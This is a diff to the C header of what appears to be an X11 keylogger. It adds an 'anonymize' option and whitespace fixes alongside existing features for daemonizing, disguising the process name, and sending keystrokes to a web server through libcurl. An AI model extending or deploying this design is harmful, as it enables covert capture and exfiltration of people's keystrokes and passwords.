@@ -77,6 +77,7 @@ struct config_struct {
 	int   silent;			/* no log to stdout */
 	int   daemonize;		/* daemonize process */
 	int   obfuscate;		/* obfuscate process name */
+	int   anonymize;		/* anonymize key input */
 	char* process_fakename;	/* process name, if obfuscation is used */
 
 #ifdef _HAVE_CURL
@@ -182,7 +183,7 @@ const struct remap_struct {
 	{"Tab","⇥"},
 	{"ISO_Left_Tab","⇤"},
 	{"ISO_Level3_Shift",""},
-#else 
+#else
 	//{"BackSpace","←"},
 
 	//{"Up","↑"},
@@ -210,7 +211,7 @@ const struct remap_struct {
 
 
 
-/* * * * * * * * * * * 
+/* * * * * * * * * * *
  * Funcion prototypes
  * * * * * * * * * * * */
 
@@ -302,7 +303,7 @@ void		clean_exit		(struct config_struct* cfg);
 int			transmit_keystroke_http(char* key, struct config_struct *cfg, int sendnow);
 /* curl_blackhole()
  * This is just a dummy write-handler, in order to prevent libcurl from
- * printing the web-server response. 
+ * printing the web-server response.
  * */
 size_t curl_blackhole(void* unused, size_t size, size_t nmemb, void* none);
 #endif
@@ -322,4 +323,3 @@ void		print_usage(char* basename);
 
 
 #endif // _X11LOG_H
-
